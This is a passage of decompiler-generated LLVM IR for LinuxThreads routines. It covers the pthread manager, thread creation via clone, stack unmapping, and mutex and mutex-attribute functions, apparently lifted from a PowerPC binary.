  %v1_1000629c = or i32 %v3_1000628c, 3840
  store i32 %v0_10006298, i32* %r6.global-to-local, align 4
  store i32 268460716, i32* @lr, align 4
  %v4_100062a8 = call i32 @clone(i32 268458920, i32 %v0_10006298, i32 %v1_1000629c, i32 %v0_10006298)
  store i32 %v4_100062a8, i32* @r3, align 4
  %v3_100062ac = icmp eq i32 %v4_100062a8, -1
  store i1 %v3_100062ac, i1* %cr7_eq.global-to-local, align 1
  store i32 %v4_100062a8, i32* %r29.global-to-local, align 4
  br i1 %v3_100062ac, label %dec_label_pc_1000630c.thread, label %dec_label_pc_100062dc

dec_label_pc_1000630c.thread:                     ; preds = %dec_label_pc_1000627c
  store i1 true, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10006314

dec_label_pc_100062dc:                            ; preds = %dec_label_pc_1000627c
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v1_100062c0 = load i32, i32* @r31, align 4
  %v2_100062c0 = add i32 %v1_100062c0, 424
  %v3_100062c0 = inttoptr i32 %v2_100062c0 to i32*
  store i32 8, i32* %v3_100062c0, align 4
  %v0_100062c4 = load i32, i32* @r31, align 4
  %v2_100062c4 = add i32 %v0_100062c4, 428
  %v3_100062c4 = inttoptr i32 %v2_100062c4 to i32*
  store i32 %v0_100062c4, i32* %v3_100062c4, align 4
  %v0_100062c8 = load i32, i32* @r31, align 4
  store i32 %v0_100062c8, i32* @global_var_1002c364.162, align 4
  %v2_100062cc = add i32 %v0_100062c8, 20
  %v3_100062cc = inttoptr i32 %v2_100062cc to i32*
  store i32 %v4_100062a8, i32* %v3_100062cc, align 4
  %v1_100062d0 = call i32 @__linuxthreads_create_event(i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v1_100062d0, i32* %r3.global-to-local, align 4
  %v0_100062d4 = load i32, i32* @r31, align 4
  %v1_100062d4 = add i32 %v0_100062d4, 28
  %v2_100062d4 = inttoptr i32 %v1_100062d4 to i32*
  %v3_100062d4 = load i32, i32* %v2_100062d4, align 4
  store i32 %v3_100062d4, i32* @r3, align 4
  store i32 268460764, i32* @lr, align 4
  %v0_100062d8 = call i32 @__pthread_unlock()
  store i32 %v0_100062d8, i32* %r3.global-to-local, align 4
  %v0_100062dc.pr = load i32, i32* %r29.global-to-local, align 4
  %v3_100062dc = icmp eq i32 %v0_100062dc.pr, 0
  store i1 %v3_100062dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100062dc, label %dec_label_pc_100062e4, label %dec_label_pc_1000630c

dec_label_pc_100062e4:                            ; preds = %dec_label_pc_100062dc, %dec_label_pc_10006264, %dec_label_pc_10006210
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_100062ec = load i32, i32* @global_var_1002c27c.137, align 4
  store i32 268458688, i32* %r3.global-to-local, align 4
  %v0_100062f4 = load i32, i32* @r31, align 4
  store i32 %v0_100062f4, i32* %r4.global-to-local, align 4
  store i32 %v0_100062f4, i32* %r6.global-to-local, align 4
  %v1_100062fc = or i32 %v3_100062ec, 3840
  store i32 268460808, i32* @lr, align 4
  %v4_10006304 = call i32 @clone(i32 268458688, i32 %v0_100062f4, i32 %v1_100062fc, i32 %v0_100062f4)
  store i32 %v4_10006304, i32* %r3.global-to-local, align 4
  store i32 %v4_10006304, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000630c

dec_label_pc_1000630c:                            ; preds = %dec_label_pc_100062dc, %dec_label_pc_100062e4
  %v0_100063a8 = phi i32 [ %v4_10006304, %dec_label_pc_100062e4 ], [ %v0_100062dc.pr, %dec_label_pc_100062dc ]
  %v3_1000630c = icmp eq i32 %v0_100063a8, -1
  store i1 %v3_1000630c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000630c, label %dec_label_pc_10006314, label %dec_label_pc_100063a8

dec_label_pc_10006314:                            ; preds = %dec_label_pc_1000630c.thread, %dec_label_pc_1000630c
  %v0_10006314 = load i32, i32* @r31, align 4
  %v1_10006314 = inttoptr i32 %v0_10006314 to i32*
  %v2_10006314 = load i32, i32* %v1_10006314, align 4
  store i32 %v2_10006314, i32* %r11.global-to-local, align 4
  %v0_10006318 = load i32, i32* @r30, align 4
  %v3_10006318 = icmp eq i32 %v0_10006318, 0
  store i1 %v3_10006318, i1* %cr7_eq.global-to-local, align 1
  %v1_1000631c = add i32 %v0_10006314, 4
  %v2_1000631c = inttoptr i32 %v1_1000631c to i32*
  %v3_1000631c = load i32, i32* %v2_1000631c, align 4
  store i32 %v3_1000631c, i32* %r0.global-to-local, align 4
  %v2_10006320 = add i32 %v2_10006314, 4
  %v3_10006320 = inttoptr i32 %v2_10006320 to i32*
  store i32 %v3_1000631c, i32* %v3_10006320, align 4
  %v0_10006324 = load i32, i32* @r31, align 4
  %v1_10006324 = add i32 %v0_10006324, 4
  %v2_10006324 = inttoptr i32 %v1_10006324 to i32*
  %v3_10006324 = load i32, i32* %v2_10006324, align 4
  store i32 %v3_10006324, i32* %r9.global-to-local, align 4
  %v0_10006328 = load i32, i32* %r11.global-to-local, align 4
  %v2_10006328 = inttoptr i32 %v3_10006324 to i32*
  store i32 %v0_10006328, i32* %v2_10006328, align 4
  br i1 %v3_10006318, label %dec_label_pc_1000633c, label %dec_label_pc_10006330

dec_label_pc_10006330:                            ; preds = %dec_label_pc_10006314
  %v0_10006330 = load i32, i32* @r30, align 4
  %v1_10006330 = add i32 %v0_10006330, 24
  %v2_10006330 = inttoptr i32 %v1_10006330 to i32*
  %v3_10006330 = load i32, i32* %v2_10006330, align 4
  store i32 %v3_10006330, i32* %r0.global-to-local, align 4
  %v3_10006334 = icmp eq i32 %v3_10006330, 0
  store i1 %v3_10006334, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006334, label %dec_label_pc_1000633c, label %dec_label_pc_10006368

dec_label_pc_1000633c:                            ; preds = %dec_label_pc_10006330, %dec_label_pc_10006314
  %v0_1000633c = load i32, i32* @r31, align 4
  %v1_1000633c = add i32 %v0_1000633c, 400
  %v2_1000633c = inttoptr i32 %v1_1000633c to i32*
  %v3_1000633c = load i32, i32* %v2_1000633c, align 4
  store i32 %v3_1000633c, i32* %r4.global-to-local, align 4
  %v3_10006340 = icmp eq i32 %v3_1000633c, 0
  store i1 %v3_10006340, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006340, label %dec_label_pc_10006350, label %dec_label_pc_10006348

dec_label_pc_10006348:                            ; preds = %dec_label_pc_1000633c
  %v1_10006348 = add i32 %v0_1000633c, 396
  %v2_10006348 = inttoptr i32 %v1_10006348 to i32*
  %v3_10006348 = load i32, i32* %v2_10006348, align 4
  store i32 %v3_10006348, i32* %r3.global-to-local, align 4
  store i32 268460880, i32* @lr, align 4
  %v2_1000634c = call i32 @munmap(i32 %v3_10006348, i32 %v3_1000633c)
  store i32 %v2_1000634c, i32* %r3.global-to-local, align 4
  %v1_1000635c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006350

dec_label_pc_10006350:                            ; preds = %dec_label_pc_1000633c, %dec_label_pc_10006348
  %v1_1000635c = phi i32 [ %v0_1000633c, %dec_label_pc_1000633c ], [ %v1_1000635c.pre, %dec_label_pc_10006348 ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10006354 = load i32, i32* @global_var_1002c39c.149, align 4
  %v1_10006358 = mul i32 %v3_10006354, 4
  store i32 %v1_10006358, i32* %r4.global-to-local, align 4
  %v2_1000635c = sub i32 %v1_1000635c, %v1_10006358
  %v1_10006360 = add i32 %v2_1000635c, 480
  store i32 %v1_10006360, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10006368.218 to i32), i32* @lr, align 4
  %v2_10006364 = call i32 @munmap(i32 %v1_10006360, i32 %v1_10006358)
  store i32 %v2_10006364, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006368

dec_label_pc_10006368:                            ; preds = %dec_label_pc_10006330, %dec_label_pc_10006350
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r8.global-to-local, align 4
  %v3_10006370 = load i32, i32* @global_var_1002c294.204, align 4
  store i32 ptrtoint (i32* @global_var_10027f00.170 to i32), i32* %r9.global-to-local, align 4
  %v0_10006378 = load i32, i32* %r24.global-to-local, align 4
  %v1_10006378 = mul i32 %v0_10006378, 16
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10006380 = add i32 %v1_10006378, ptrtoint (i32* @global_var_10027f00.170 to i32)
  store i32 %v2_10006380, i32* %r11.global-to-local, align 4
  %v1_10006384 = add i32 %v3_10006370, -1
  store i32 %v1_10006384, i32* %r10.global-to-local, align 4
  %v2_10006388 = add i32 %v1_10006378, add (i32 ptrtoint (i32* @global_var_10027f00.170 to i32), i32 12)
  %v3_10006388 = inttoptr i32 %v2_10006388 to i32*
  store i32 0, i32* %v3_10006388, align 4
  %v0_1000638c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000638c, i32* @global_var_1002c294.204, align 4
  %v0_10006390 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006390 = load i32, i32* %r11.global-to-local, align 4
  %v2_10006390 = add i32 %v1_10006390, 8
  %v3_10006390 = inttoptr i32 %v2_10006390 to i32*
  store i32 %v0_10006390, i32* %v3_10006390, align 4
  %v0_10006394 = call i32 @__errno_location()
  store i32 %v0_10006394, i32* %r3.global-to-local, align 4
  %v1_10006398 = inttoptr i32 %v0_10006394 to i32*
  %v2_10006398 = load i32, i32* %v1_10006398, align 4
  store i32 %v2_10006398, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100063b4

dec_label_pc_100063a0:                            ; preds = %dec_label_pc_10006108
  store i32 11, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100063b4

dec_label_pc_100063a8:                            ; preds = %dec_label_pc_1000630c
  %v1_100063a8 = load i32, i32* @r31, align 4
  %v2_100063a8 = add i32 %v1_100063a8, 20
  %v3_100063a8 = inttoptr i32 %v2_100063a8 to i32*
  store i32 %v0_100063a8, i32* %v3_100063a8, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_100063b0 = load i32, i32* %r28.global-to-local, align 4
  %v1_100063b0 = load i32, i32* %r23.global-to-local, align 4
  %v2_100063b0 = add i32 %v1_100063b0, 48
  %v3_100063b0 = inttoptr i32 %v2_100063b0 to i32*
  store i32 %v0_100063b0, i32* %v3_100063b0, align 4
  %v0_100063b4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100063b4

dec_label_pc_100063b4:                            ; preds = %dec_label_pc_10005fd0, %dec_label_pc_100063a0, %dec_label_pc_10006368, %dec_label_pc_100063a8
  %v0_100063b4 = phi i32 [ 1, %dec_label_pc_10005fd0 ], [ 11, %dec_label_pc_100063a0 ], [ %v2_10006398, %dec_label_pc_10006368 ], [ %v0_100063b4.pre, %dec_label_pc_100063a8 ]
  %v1_100063b4 = load i32, i32* %r23.global-to-local, align 4
  %v2_100063b4 = add i32 %v1_100063b4, 52
  %v3_100063b4 = inttoptr i32 %v2_100063b4 to i32*
  store i32 %v0_100063b4, i32* %v3_100063b4, align 4
  %v3_100063b8 = load i32, i32* %stack_var_-224, align 4
  store i32 %v3_100063b8, i32* @r3, align 4
  br label %dec_label_pc_100064c4

dec_label_pc_100064c4:                            ; preds = %dec_label_pc_10005f24, %dec_label_pc_100063b4
  store i32 268461256, i32* @lr, align 4
  %v0_100064c4 = call i32 @restart.4()
  store i32 %v0_100064c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005f04

; uselistorder directives
  uselistorder i32 %v1_10006378, { 1, 0 }
  uselistorder i32 %v1_10006358, { 2, 1, 0 }
  uselistorder i32 %v0_100062c4, { 1, 0 }
  uselistorder i32 %v0_10006298, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10006190, { 1, 0 }
  uselistorder i32 %v1_10006144, { 1, 0 }
  uselistorder i32 %v0_10006110, { 1, 0, 2 }
  uselistorder i32 %v1_10006108, { 2, 3, 1, 0 }
  uselistorder i32 %v3_100060d0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_100060a0, { 2, 1, 0 }
  uselistorder i32 %v2_10006094, { 1, 0 }
  uselistorder i32 %v2_10006070, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10006058, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10006058, { 1, 0, 2 }
  uselistorder i32 %v3_10006024, { 1, 0, 2 }
  uselistorder i1 %v3_10006008, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10006008, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_10005ff0, { 1, 0 }
  uselistorder i32 %v0_10006090, { 2, 0, 1 }
  uselistorder i32 %v3_10005fa4, { 1, 0, 2 }
  uselistorder i32 %v2_10005e4c, { 3, 2, 1, 0, 5, 4, 7, 6, 9, 8 }
  uselistorder i32* %stack_var_-360, { 1, 0 }
  uselistorder i32 %tmp16, { 1, 0, 2, 3 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 21, 22, 18, 19, 23, 24, 25, 27, 26 }
  uselistorder i32* %r3.global-to-local, { 32, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 35, 36, 2, 33, 34, 37, 38, 1, 39, 40, 41, 42, 43, 44, 45, 47, 46, 48, 49, 0 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r26.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r25.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r24.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 31, 21, 22, 23, 24, 26, 25, 20, 28, 27, 29, 30 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 3, 4, 32, 5, 6, 7, 8, 9, 10, 19, 11, 12, 13, 14, 15, 16, 17, 18, 21, 20, 33, 31, 23, 24, 25, 22, 26, 27, 28, 29, 30 }
  uselistorder i32 ()* @restart.4, { 1, 0 }
  uselistorder i32 (i32, i32)* @munmap, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__linuxthreads_create_event, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @clone, { 3, 2, 1, 0 }
  uselistorder i32 3840, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @sched_getparam, { 1, 0 }
  uselistorder i32 (i32)* @sched_getscheduler, { 1, 0 }
  uselistorder i32 480, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 2097152, { 4, 1, 5, 2, 3, 0 }
  uselistorder i32 ()* @getppid, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10015cd0.214 to i32), { 0, 2, 1 }
  uselistorder i32 (i32)* @__pthread_manager_adjust_prio, { 2, 1, 0 }
  uselistorder i32* @global_var_1002c254, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @global_var_10027ca8.207, { 1, 0 }
  uselistorder i32 268566528, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100064c4, { 1, 0 }
  uselistorder label %dec_label_pc_100063b4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10006368, { 1, 0 }
  uselistorder label %dec_label_pc_10006350, { 1, 0 }
  uselistorder label %dec_label_pc_10006314, { 1, 0 }
  uselistorder label %dec_label_pc_1000630c, { 1, 0 }
  uselistorder label %dec_label_pc_10006210, { 1, 0 }
  uselistorder label %dec_label_pc_10006208, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006110, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006084, { 1, 0 }
  uselistorder label %dec_label_pc_10005fec, { 1, 0 }
  uselistorder label %dec_label_pc_10005f50, { 1, 0 }
  uselistorder label %dec_label_pc_10005f04, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_10005ef8, { 1, 0 }
  uselistorder label %dec_label_pc_10005eac, { 2, 0, 1 }
}

define i32 @__pthread_manager_event(i32 %arg1) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg1, i32* %r28.global-to-local, align 4
  %v3_1000651c = load i32, i32* bitcast (i32** @global_var_10027c7c.158 to i32*), align 4
  store i32 %v3_1000651c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10027c60.156 to i32), i32* @r2, align 4
  store i32 268461356, i32* @lr, align 4
  %v0_10006528 = call i32 @__pthread_lock()
  %v3_1000652c = load i32, i32* bitcast (i32** @global_var_10027c7c.158 to i32*), align 4
  store i32 %v3_1000652c, i32* @r3, align 4
  store i32 268461364, i32* @lr, align 4
  %v0_10006530 = call i32 @__pthread_unlock()
  %v0_10006534 = load i32, i32* %r28.global-to-local, align 4
  %v1_10006538 = call i32 @__pthread_manager(i32 %v0_10006534)
  ret i32 %v1_10006538

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_10027c60.156 to i32), { 2, 3, 6, 1, 4, 7, 0, 5, 8 }
}

define i32 @__pthread_trylock(i32* %arg1) local_unnamed_addr {
entry:
  %v2_100065406 = load i32, i32* %arg1, align 4
  %v3_100065447 = icmp eq i32 %v2_100065406, 0
  br i1 %v3_100065447, label %dec_label_pc_10006554.lr.ph, label %dec_label_pc_1000654c

dec_label_pc_10006554.lr.ph:                      ; preds = %entry
  %r11.promoted.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10006554

dec_label_pc_1000654c:                            ; preds = %dec_label_pc_10006568, %entry
  ret i32 16

dec_label_pc_10006554:                            ; preds = %dec_label_pc_10006554.lr.ph, %dec_label_pc_10006568
  %v5_10006558 = icmp eq i32 %r11.promoted.pre, 0
  br i1 %v5_10006558, label %dec_label_pc_10006574, label %dec_label_pc_10006568

dec_label_pc_10006568:                            ; preds = %dec_label_pc_10006554
  %v2_10006540 = load i32, i32* %arg1, align 4
  %v3_10006544 = icmp eq i32 %v2_10006540, 0
  br i1 %v3_10006544, label %dec_label_pc_10006554, label %dec_label_pc_1000654c

dec_label_pc_10006574:                            ; preds = %dec_label_pc_10006554
  store i32 0, i32* @r11, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10006554, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32* %arg1) local_unnamed_addr {
entry:
  %v2_100065806 = load i32, i32* %arg1, align 4
  %v3_100065847 = icmp eq i32 %v2_100065806, 0
  br i1 %v3_100065847, label %dec_label_pc_10006594.lr.ph, label %dec_label_pc_1000658c

dec_label_pc_10006594.lr.ph:                      ; preds = %entry
  %r11.promoted.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10006594

dec_label_pc_1000658c:                            ; preds = %dec_label_pc_100065a8, %entry
  ret i32 16

dec_label_pc_10006594:                            ; preds = %dec_label_pc_10006594.lr.ph, %dec_label_pc_100065a8
  %v5_10006598 = icmp eq i32 %r11.promoted.pre, 0
  br i1 %v5_10006598, label %dec_label_pc_100065b4, label %dec_label_pc_100065a8

dec_label_pc_100065a8:                            ; preds = %dec_label_pc_10006594
  %v2_10006580 = load i32, i32* %arg1, align 4
  %v3_10006584 = icmp eq i32 %v2_10006580, 0
  br i1 %v3_10006584, label %dec_label_pc_10006594, label %dec_label_pc_1000658c

dec_label_pc_100065b4:                            ; preds = %dec_label_pc_10006594
  ret i32 0

; uselistorder directives
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10006594, { 1, 0 }
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_100065bc = icmp eq i32* %arg2, null
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100065c4 = add i32 %arg1, 20
  %v3_100065c4 = inttoptr i32 %v2_100065c4 to i32*
  store i32 0, i32* %v3_100065c4, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v0_100065cc = load i32, i32* %r0.global-to-local, align 4
  %v2_100065cc = add i32 %arg1, 16
  %v3_100065cc = inttoptr i32 %v2_100065cc to i32*
  store i32 %v0_100065cc, i32* %v3_100065cc, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  br i1 %v3_100065bc, label %dec_label_pc_100065dc, label %dec_label_pc_100065d8

dec_label_pc_100065d8:                            ; preds = %entry
  %v2_100065d8 = load i32, i32* %arg2, align 4
  store i32 %v2_100065d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100065dc

dec_label_pc_100065dc:                            ; preds = %entry, %dec_label_pc_100065d8
  %v0_100065dc = load i32, i32* %r9.global-to-local, align 4
  %v2_100065dc = add i32 %arg1, 8
  %v3_100065dc = inttoptr i32 %v2_100065dc to i32*
  store i32 %v0_100065dc, i32* %v3_100065dc, align 4
  %v0_100065e0 = load i32, i32* %r0.global-to-local, align 4
  %v2_100065e0 = add i32 %arg1, 12
  %v3_100065e0 = inttoptr i32 %v2_100065e0 to i32*
  store i32 %v0_100065e0, i32* %v3_100065e0, align 4
  %v0_100065e4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100065e4 = add i32 %arg1, 4
  %v3_100065e4 = inttoptr i32 %v2_100065e4 to i32*
  store i32 %v0_100065e4, i32* %v3_100065e4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_100065dc, { 1, 0 }
}

define i32 @pthread_mutex_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100065f0 = add i32 %arg1, 12
  %v2_100065f0 = inttoptr i32 %v1_100065f0 to i32*
  %v3_100065f0 = load i32, i32* %v2_100065f0, align 4
  %v1_100065f8 = icmp slt i32 %v3_100065f0, 0
  br i1 %v1_100065f8, label %dec_label_pc_1000663c, label %dec_label_pc_10006604

dec_label_pc_10006604:                            ; preds = %entry
  %tmp = icmp slt i32 %v3_100065f0, 2
  br i1 %tmp, label %dec_label_pc_10006614, label %dec_label_pc_1000660c

dec_label_pc_1000660c:                            ; preds = %dec_label_pc_10006604
  %tmp2 = icmp slt i32 %v3_100065f0, 4
  br i1 %tmp2, label %dec_label_pc_10006624, label %dec_label_pc_1000663c

dec_label_pc_10006614:                            ; preds = %dec_label_pc_10006604
  %v1_10006614 = add i32 %arg1, 16
  %v2_10006614 = inttoptr i32 %v1_10006614 to i32*
  %v3_10006614 = load i32, i32* %v2_10006614, align 4
  %v1_10006618 = urem i32 %v3_10006614, 2
  %v3_10006618 = icmp eq i32 %v1_10006618, 0
  br i1 %v3_10006618, label %dec_label_pc_10006638, label %dec_label_pc_10006630

dec_label_pc_10006624:                            ; preds = %dec_label_pc_1000660c
  %v1_10006624 = add i32 %arg1, 16
  %v2_10006624 = inttoptr i32 %v1_10006624 to i32*
  %v3_10006624 = load i32, i32* %v2_10006624, align 4
  %v3_10006628 = icmp eq i32 %v3_10006624, 0
  br i1 %v3_10006628, label %dec_label_pc_10006638, label %dec_label_pc_10006630

dec_label_pc_10006630:                            ; preds = %dec_label_pc_10006614, %dec_label_pc_10006624
  br label %dec_label_pc_1000663c

dec_label_pc_10006638:                            ; preds = %dec_label_pc_10006614, %dec_label_pc_10006624
  br label %dec_label_pc_1000663c

dec_label_pc_1000663c:                            ; preds = %dec_label_pc_1000660c, %entry, %dec_label_pc_10006630, %dec_label_pc_10006638
  %v0_1000663c = phi i32 [ 22, %dec_label_pc_1000660c ], [ 22, %entry ], [ 16, %dec_label_pc_10006630 ], [ 0, %dec_label_pc_10006638 ]
  ret i32 %v0_1000663c

; uselistorder directives
  uselistorder label %dec_label_pc_1000663c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10006638, { 1, 0 }
  uselistorder label %dec_label_pc_10006630, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000665c = icmp ugt i32 %arg2, 3
  br i1 %v2_1000665c, label %dec_label_pc_10006670, label %dec_label_pc_10006668

dec_label_pc_10006668:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10006670

dec_label_pc_10006670:                            ; preds = %entry, %dec_label_pc_10006668
  %v0_10006670 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10006668 ]
  ret i32 %v0_10006670

; uselistorder directives
  uselistorder label %dec_label_pc_10006670, { 1, 0 }
}

define i32 @__pthread_mutexattr_gettype(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10006678 = load i32, i32* %arg1, align 4
  %v2_10006680 = inttoptr i32 %arg2 to i32*
  store i32 %v2_10006678, i32* %v2_10006680, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10006698 = icmp eq i32 %arg1, 0
  %v2_10006698 = icmp ugt i32 %arg1, 1
  %v0_100066a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10006698, i32 %v0_100066a8)
  %v1_100066b0 = select i1 %v1_10006698, i32 0, i32 38
  ret i32 %v1_100066b0
}

define i32 @__pthread_once_fork_child(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100066d0 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_1002c82c.221 to i32), i32* null)
  %v3_100066e0 = call i32 @pthread_cond_init(i32* nonnull @global_var_1002c844.222, i32 0)
  %v3_100066e8 = load i32, i32* @global_var_1002c36c.223, align 4
  %v3_100066f4 = icmp sgt i32 %v3_100066e8, 2147483643
  %v1_100066f8 = add i32 %v3_100066e8, 4
  br i1 %v3_100066f4, label %dec_label_pc_10006708, label %dec_label_pc_10006710

dec_label_pc_10006708:                            ; preds = %entry
  br label %dec_label_pc_10006710

dec_label_pc_10006710:                            ; preds = %entry, %dec_label_pc_10006708
  %storemerge = phi i32 [ 0, %dec_label_pc_10006708 ], [ %v1_100066f8, %entry ]
  store i32 %storemerge, i32* @global_var_1002c36c.223, align 4
  ret i32 %v3_100066e0

; uselistorder directives
  uselistorder label %dec_label_pc_10006710, { 1, 0 }
}

define i32 @pthread_mutex_unlock() local_unnamed_addr {
entry:
  %v0_1000672c = load i32, i32* @r3, align 4
  %v1_1000672c = add i32 %v0_1000672c, 12
  %v2_1000672c = inttoptr i32 %v1_1000672c to i32*
  %v3_1000672c = load i32, i32* %v2_1000672c, align 4
  %v3_10006730 = icmp eq i32 %v3_1000672c, 1
  br i1 %v3_10006730, label %dec_label_pc_10006760, label %dec_label_pc_10006738

dec_label_pc_10006738:                            ; preds = %entry
  %v2_10006730 = icmp sgt i32 %v3_1000672c, 1
  br i1 %v2_10006730, label %dec_label_pc_10006748, label %dec_label_pc_1000673c

dec_label_pc_1000673c:                            ; preds = %dec_label_pc_10006738
  %v3_1000673c = icmp eq i32 %v3_1000672c, 0
  br i1 %v3_1000673c, label %dec_label_pc_10006790, label %dec_label_pc_10006758

dec_label_pc_10006748:                            ; preds = %dec_label_pc_10006738
  %v3_10006748 = icmp eq i32 %v3_1000672c, 2
  br i1 %v3_10006748, label %dec_label_pc_100067a0, label %dec_label_pc_10006750

dec_label_pc_10006750:                            ; preds = %dec_label_pc_10006748
  %v3_10006750 = icmp eq i32 %v3_1000672c, 3
  br i1 %v3_10006750, label %dec_label_pc_100067c0, label %dec_label_pc_10006758

dec_label_pc_10006758:                            ; preds = %dec_label_pc_1000673c, %dec_label_pc_10006750
  store i32 22, i32* @r9, align 4
  br label %dec_label_pc_100067d0

dec_label_pc_10006760:                            ; preds = %entry
  %v1_10006760 = add i32 %v0_1000672c, 8
  %v2_10006760 = inttoptr i32 %v1_10006760 to i32*
  %v3_10006760 = load i32, i32* %v2_10006760, align 4
  %v1_10006764 = load i32, i32* @r2, align 4
  %v4_10006764 = icmp eq i32 %v3_10006760, %v1_10006764
  br i1 %v4_10006764, label %dec_label_pc_1000676c, label %dec_label_pc_100067cc

dec_label_pc_1000676c:                            ; preds = %dec_label_pc_10006760
  %v1_1000676c = add i32 %v0_1000672c, 4
  %v2_1000676c = inttoptr i32 %v1_1000676c to i32*
  %v3_1000676c = load i32, i32* %v2_1000676c, align 4
  %tmp6 = icmp slt i32 %v3_1000676c, 1
  br i1 %tmp6, label %dec_label_pc_10006788, label %dec_label_pc_10006778

dec_label_pc_10006778:                            ; preds = %dec_label_pc_1000676c
  %v1_10006778 = add i32 %v3_1000676c, -1
  store i32 0, i32* @r9, align 4
  store i32 %v1_10006778, i32* %v2_1000676c, align 4
  %v0_100067d4.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_100067d0

dec_label_pc_10006788:                            ; preds = %dec_label_pc_1000676c
